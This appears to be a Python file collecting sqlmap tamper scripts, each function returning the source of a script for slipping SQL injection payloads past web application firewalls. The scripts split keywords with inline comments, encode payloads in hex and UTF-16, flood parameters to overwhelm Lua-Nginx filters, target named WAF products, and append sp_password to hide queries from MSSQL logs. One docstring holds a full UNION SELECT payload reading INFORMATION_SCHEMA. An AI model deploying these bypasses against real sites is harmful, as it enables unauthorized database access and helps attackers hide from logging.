#!/usr/bin/env python
# -*- coding: utf-8 -*-

def CommentBypass():
    payload = '''
     #!/usr/bin/env python
    
    """
    Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
    See the file 'LICENSE' for copying permission
    """
    
    import re
    
    from lib.core.common import randomRange
    from lib.core.compat import xrange
    from lib.core.data import kb
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.LOW
    
    def tamper(payload, **kwargs):
        """
        Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
    
        >>> import random
        >>> random.seed(0)
        >>> tamper('INSERT')
        'I/**/NS/**/ERT'
        """
    
        retVal = payload
    
        if payload:
            for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
                word = match.group()
    
                if len(word) < 2:
                    continue
    
                if word.upper() in kb.keywords:
                    _ = word[0]
    
                    for i in xrange(1, len(word) - 1):
                        _ += "%s%s" % ("/**/" if randomRange(0, 1) else "", word[i])
    
                    _ += word[-1]
    
                    if "/**/" not in _:
                        index = randomRange(1, len(word) - 1)
                        _ = word[:index] + "/**/" + word[index:]
    
                    retVal = retVal.replace(word, _)
    
        return retVal
    '''
    return payload

def EvtBypass():
    payload = '''
    #!/usr/bin/env python
    
    """
    Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
    See the file 'LICENSE' for copying permission
    """
    
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.HIGH
    
    def tamper(payload, **kwargs):
        """
        Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
    
        Requirement:
            * MSSQL
    
        Notes:
            * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure
            * Reference: http://websec.ca/kb/sql_injection
    
        >>> tamper('1 AND 9227=9227-- ')
        '1 AND 9227=9227-- sp_password'
        """
    
        retVal = ""
    
        if payload:
            retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")
    
        return retVal
    '''
    return payload

def Utf16Bypass():
    payload = '''
    #!/usr/bin/env python
    
    import binascii
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.LOWEST
    
    def dependencies(): 
        pass
    
    def tamper(payload, ** kwargs):
    
        payload = bytes(payload)
        payload = str(binascii.hexlify(payload))
        utf16_prefix = '\\u00'
        array = [payload[i:i+2] for i in range(0, len(payload), 2)]
        win = ""
    
        for element in array:
            win += utf16_prefix+element
    
        return win
    '''
    return payload

def JsonBypass():
    payload = '''
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
    
    
    def tamper(payload, **kwargs):
       line = payload.encode("hex")
       n=2
       groups = [line[i:i+n] for i in range(0, len(line), n)]
       full = ''
       for x in groups:
           full = full + "00" + x
       retVal = full
    
       return retVal
    '''
    return payload

def Bypass360():
    payload = '''
    from lib.core.enums import PRIORITY
    from lib.core.settings import UNICODE_ENCODING
    __priority__ = PRIORITY.LOW
    def dependencies():
      pass
    def tamper(payload, **kwargs):
      """
      Replaces keywords
      >>> tamper('UNION SELECT id FROM users')
      '1 union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/ NULL,/*!12345CONCAT*/(0x7170706271,IFNULL(/*!12345CASt(*/COUNT(*) AS CHAR),0x20),0x7171786b71),NULL/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x73716c696e6a656374--
      """
      if payload:
          payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
          payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
          payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/")
          payload=payload.replace("CONCAT","/*!12345CONCAT*/")
          payload=payload.replace("CAST(","/*!12345CAST(*/")
          payload=payload.replace("CASE","/*!12345CASE*/")
          payload=payload.replace("DATABASE()","database/**/()")
                    
      return payload
    '''
    return payload

def BypassLua():
    payload = '''
    #!/usr/bin/env python
    
    """
    Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
    See the file 'LICENSE' for copying permission
    """
    
    import random
    import string
    
    from lib.core.compat import xrange
    from lib.core.enums import HINT
    from lib.core.enums import PRIORITY
    from lib.core.settings import DEFAULT_GET_POST_DELIMITER
    
    __priority__ = PRIORITY.NORMAL
    
    def tamper(payload, **kwargs):
        """
        LUA-Nginx WAFs Bypass (e.g. Cloudflare)
    
        Reference:
            * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/
    
        Notes:
            * Lua-Nginx WAFs do not support processing of more than 100 parameters
    
        >>> random.seed(0); hints={}; payload = tamper("1 AND 2>1", hints=hints); "%s&%s" % (hints[HINT.PREPEND], payload)
        '34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'
        """
    
        hints = kwargs.get("hints", {})
        delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)
    
        hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(500))
    
        return payload
    '''
    return payload

def BypassDun():
    payload = '''
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.LOW
    
    
    def dependencies():
        pass
    
    
    def tamper(payload, **kwargs):
        """
                BYPASS Ddun
        """
        retVal = payload
        if payload:
            retVal = ""
            quote, doublequote, firstspace = False, False, False
            for i in xrange(len(payload)):
                if not firstspace:
                    if payload[i].isspace():
                        firstspace = True
                        retVal += "/*DJSAWW%2B%26Lt%3B%2B*/"
                        continue
                elif payload[i] == '\'':
                    quote = not quote
                elif payload[i] == '"':
                    doublequote = not doublequote
                elif payload[i] == " " and not doublequote and not quote:
                    retVal += "/*DJSAWW%2B%26Lt%3B%2B*/"
                    continue
                retVal += payload[i]
        return retVal 
    '''
    return payload

def BypassDog():
    payload = '''
    from lib.core.enums import PRIORITY
    from lib.core.settings import UNICODE_ENCODING
    __priority__ = PRIORITY.LOW
    def dependencies():
        pass
    def tamper(payload, **kwargs):
    
        if payload:
            payload=payload.replace(" ","/*!*/")
            payload=payload.replace("=","/*!*/=/*!*/")
            payload=payload.replace("AND","/*!*/AND/*!*/")
            payload=payload.replace("UNION","union/*!88888cas*/")
            payload=payload.replace("#","/*!*/#")
            payload=payload.replace("USER()","USER/*!()*/")
            payload=payload.replace("DATABASE()","DATABASE/*!()*/")
            payload=payload.replace("--","/*!*/--")
            payload=payload.replace("SELECT","/*!88888cas*/select")
            payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
            print payload
    
            return payload
	'''
    return payload

def BypassYsuo():
    payload = '''
    import re
    
    from lib.core.data import kb
    from lib.core.enums import PRIORITY
    from lib.core.common import singleTimeWarnMessage
    from lib.core.enums import DBMS
    __priority__ = PRIORITY.LOW
    
    
    def dependencies():
        pass
    
    
    def tamper(payload, **kwargs):
        payload = payload.replace('ORDER', '/*!00000order*/')
        payload = payload.replace('ALL SELECT', '/*!00000all*/ /*!00000select')
        payload = payload.replace('CONCAT(', "CONCAT/**/(")
        payload = payload.replace("--", " */--")
        payload = payload.replace("AND", "%26%26")
        return payload
    '''
    return payload
